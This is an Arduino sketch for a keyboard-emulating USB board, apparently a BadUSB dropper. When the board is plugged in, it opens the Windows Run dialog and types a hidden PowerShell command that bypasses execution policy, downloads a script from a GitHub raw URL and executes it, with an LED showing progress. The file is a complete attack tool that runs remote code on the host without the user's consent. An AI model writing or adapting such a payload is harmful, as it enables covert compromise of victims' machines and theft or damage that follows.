#include <Adafruit_NeoPixel.h>
#include <Keyboard.h>
 
int Power = 11;
int PIN  = 12;
#define NUMPIXELS 1
 
Adafruit_NeoPixel pixels(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);
 
void setup() 
{
  Keyboard.begin();
  pixels.begin();
  pinMode(Power,OUTPUT);
  digitalWrite(Power, HIGH);
  pixels.setPixelColor(0, pixels.Color(255, 0, 0));
  pixels.show();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell -W H -Ex B -c \"iex (iwr 'https://github.com/smcbride-ca/G/raw/test/i.ps1').Content\"");
  pixels.setPixelColor(0, pixels.Color(0, 255, 0));
  pixels.show();
}
 
void loop() { 

}
